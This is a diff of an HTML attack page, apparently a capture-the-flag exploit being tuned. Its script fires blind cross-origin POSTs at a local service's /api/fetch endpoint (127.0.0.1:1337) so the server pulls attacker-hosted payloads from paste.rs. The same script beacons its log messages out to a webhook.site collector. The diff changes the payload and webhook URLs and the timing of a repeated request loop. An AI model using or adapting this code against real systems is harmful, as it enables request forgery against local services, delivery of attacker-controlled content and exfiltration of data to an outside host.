@@ -1,12 +1,12 @@
 <!DOCTYPE html><html><head><meta charset="utf-8"><title>x</title></head><body>
 <pre id="l">boot</pre>
 <script>
-const WH = "https://webhook.site/69285a81-ff8c-45d2-838a-ae4a3a9830f8";
+const WH = "https://webhook.site/56bb9b65-25cd-4a20-9fba-579658cf66c6";
 const T = "http://127.0.0.1:1337";
-const TAR_A = "https://paste.rs/plyq6";
-const TAR_B = "https://paste.rs/3LxUu";
-const TAR_C = "https://paste.rs/fMKlq";
-const TAR_D = "https://paste.rs/LBYXZ";
+const TAR_A = "https://paste.rs/3p2HE";
+const TAR_B = "https://paste.rs/1zRXP";
+const TAR_C = "https://paste.rs/QVGaa";
+const TAR_D = "https://paste.rs/hF2kB";
 const log = (m) => {
   try { document.getElementById("l").textContent += "\n" + m; } catch (e) {}
   new Image().src = WH + "?m=" + encodeURIComponent(String(m).slice(0, 1400));
@@ -32,9 +32,9 @@ try { blankPost("/api/fetch", { url: TAR_C }); log("sent_C"); } catch (e) { log(
 setTimeout(function(){ try { blankPost("/api/fetch", { url: TAR_A }); log("sent_A"); } catch(e){} }, 300);
 setTimeout(function(){ try { blankPost("/api/fetch", { url: TAR_B }); log("sent_B"); } catch(e){} }, 500);
 setTimeout(function(){ try { blankPost("/api/fetch", { url: TAR_D }); log("sent_D"); } catch(e){} }, 700);
-for (let n = 0; n < 5; n++) {
-  setTimeout(function(){ blankPost("/api/fetch", { url: TAR_A }); }, 1000 + n*400);
-  setTimeout(function(){ blankPost("/api/fetch", { url: TAR_B }); }, 1100 + n*400);
+for (let n = 0; n < 6; n++) {
+  setTimeout(function(){ blankPost("/api/fetch", { url: TAR_A }); }, 1000 + n*350);
+  setTimeout(function(){ blankPost("/api/fetch", { url: TAR_B }); }, 1150 + n*350);
 }
 setTimeout(function(){
   log("open_ledger");
